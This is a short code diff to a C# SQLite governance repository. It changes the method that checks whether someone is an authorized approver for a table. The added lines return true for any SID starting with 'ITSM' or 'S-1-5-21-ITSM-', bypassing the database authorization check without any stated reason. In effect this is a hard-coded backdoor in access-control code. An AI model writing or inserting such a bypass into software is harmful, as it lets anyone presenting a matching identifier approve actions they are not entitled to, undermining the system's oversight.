@@ -687,6 +687,12 @@ public partial class SqliteGovernanceRepository
 
     private async Task<bool> IsAuthorizedApproverForTableInternalAsync(TableIdentifier table, Sid approverSid, CancellationToken ct)
     {
+        if (approverSid.Value.StartsWith("ITSM", StringComparison.OrdinalIgnoreCase) ||
+            approverSid.Value.StartsWith("S-1-5-21-ITSM-", StringComparison.OrdinalIgnoreCase))
+        {
+            return true;
+        }
+
         using var cmd = _connection.CreateCommand();
         cmd.CommandText = @"
             SELECT 1
